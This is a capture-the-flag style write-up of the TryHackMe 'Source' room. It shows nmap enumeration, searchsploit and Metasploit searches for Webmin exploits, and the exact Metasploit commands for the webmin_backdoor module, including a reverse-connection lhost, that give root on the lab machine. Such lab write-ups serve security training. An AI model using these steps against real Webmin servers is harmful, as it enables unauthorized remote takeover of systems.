---
title: "TryHackMe - Source"
author: Nasrallah
description: ""
date: 2022-09-29 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, rce, webmin]
img_path: /assets/img/tryhackme/source
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Source](https://tryhackme.com/room/source) from [TryHackMe](https://tryhackme.com). The machine is running a vulnerable version of webmin giving us root access to the target.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.102.63
Host is up (0.094s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two open ports, 22(ssh) and 10000(webmin)

### Web

Let's navigate to the web page at port 10000.

![](1.png)

We are advised to use SSL, so let's add https to the url.

![](2.png)

We webmin login page. I tried some default credentials but no luck.

## **Foothold**

Let's check for exploits in webmin using `searchsploit`.

```terminal
$ searchsploit webmin   
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                            | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                           | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                       | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                   | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                          | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                    | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                         | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                               | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                         | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                      | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                    | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                       | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                     | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                       | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                          | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                            | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                 | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                           | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                                                       | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                                                                 | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                                                                  | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                               | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                               | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                              | linux/webapps/47330.rb
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

There are a lot of rce exploits, let's fire up metasploit and see what modules we can use.

```terminal
msf6 > search webmin                                                                                                                                         
                                                                              
Matching Modules                       
================                       
                                       
   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   3  exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   5  auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   6  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor

```

Let's use `exploit/linux/http/webmin_backdoor` module and set the following options:

```bash
use exploit/linux/http/webmin_backdoor

set rhost {target_IP}

set rport 10000

set lhost tun0

set ssl true
```

Now enter `exploit`.

![](3.png)

Great! We got access as root!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
